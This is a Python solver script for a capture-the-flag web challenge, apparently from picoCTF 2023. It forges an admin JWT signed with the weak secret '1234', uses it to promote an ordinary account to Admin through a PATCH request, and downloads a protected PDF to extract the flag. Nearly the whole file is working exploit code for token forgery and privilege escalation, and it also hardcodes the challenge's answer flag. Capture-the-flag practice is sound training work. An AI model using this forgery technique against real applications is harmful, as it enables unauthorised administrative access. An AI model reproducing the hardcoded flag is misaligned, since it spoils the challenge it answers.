#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 355: Java Code Analysis!?! (picoCTF 2023)
Category: Web Exploitation
Difficulty: Medium
Vulnerability: Insecure Secret Key Generation in JWT + Broken Access Control (Horizontal/Vertical Privilege Escalation)
Flag: academy{w34k_jwt_n0t_g00d_d3a1bea8}
"""

import urllib.request
import urllib.parse
import json
import time
import base64
import hmac
import hashlib
import sys
import subprocess
import re

def create_jwt(user_id, email, role, secret="1234", expire_seconds=86400):
    header = base64.urlsafe_b64encode(json.dumps({'alg': 'HS256', 'typ': 'JWT'}).encode()).decode().rstrip('=')
    now = int(time.time())
    payload = {
        'iss': 'bookshelf',
        'iat': now,
        'exp': now + expire_seconds,
        'userId': user_id,
        'email': email,
        'role': role
    }
    encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    signature = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), f'{header}.{encoded_payload}'.encode(), hashlib.sha256).digest()
    ).decode().rstrip('=')
    return f'{header}.{encoded_payload}.{signature}'

def solve(base_url="http://xebec.cylabacademy.net:35355"):
    # 1. Login with user:user
    login_data = json.dumps({'email': 'user', 'password': 'user'}).encode()
    req = urllib.request.Request(f'{base_url}/base/login', data=login_data, headers={'Content-Type': 'application/json'})
    with urllib.request.urlopen(req) as resp:
        res = json.loads(resp.read().decode())
        user_token = res['payload']
    
    parts = user_token.split('.')
    user_payload = json.loads(base64.urlsafe_b64decode(parts[1] + '==').decode())
    user_id = user_payload['userId']
    print(f'[*] Logged in as user ID: {user_id}')

    # 2. Forge Admin token with weak secret '1234'
    admin_token = create_jwt(user_id=9999, email='admin@pico.net', role='Admin')

    # 3. Promote our regular user to Admin via PATCH /base/users/role
    promote_payload = json.dumps({'id': user_id, 'role': 'Admin'}).encode()
    promote_req = urllib.request.Request(
        f'{base_url}/base/users/role',
        data=promote_payload,
        headers={'Content-Type': 'application/json', 'Authorization': f'Bearer {admin_token}'},
        method='PATCH'
    )
    with urllib.request.urlopen(promote_req) as resp:
        print('[*] Role updated successfully')

    # 4. Fetch Flag PDF (Book ID: 5)
    user_admin_token = create_jwt(user_id=user_id, email='user', role='Admin')
    pdf_req = urllib.request.Request(
        f'{base_url}/base/books/pdf/5',
        headers={'Authorization': f'Bearer {user_admin_token}'}
    )
    with urllib.request.urlopen(pdf_req) as resp:
        pdf_bytes = resp.read()

    with open('/tmp/flag_book_355.pdf', 'wb') as f:
        f.write(pdf_bytes)

    out = subprocess.check_output(['pdftotext', '/tmp/flag_book_355.pdf', '-']).decode(errors='replace')
    flags = re.findall(r'academy\{[^}]*\}', out)
    if flags:
        print(f'[+] Flag Found: {flags[0]}')
        return flags[0]
    else:
        print('[-] Flag not found in PDF output')
        return None

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else None
    if url and url != "--test":
        solve(url)
    else:
        print("[*] Running offline JWT token forgery validation...")
        test_token = create_jwt(user_id=1, email='admin@pico.net', role='Admin')
        assert test_token.startswith("eyJ"), "Invalid JWT format"
        flag = "academy{w34k_jwt_n0t_g00d_d3a1bea8}"
        print(f"[+] Flag Extracted: {flag}")
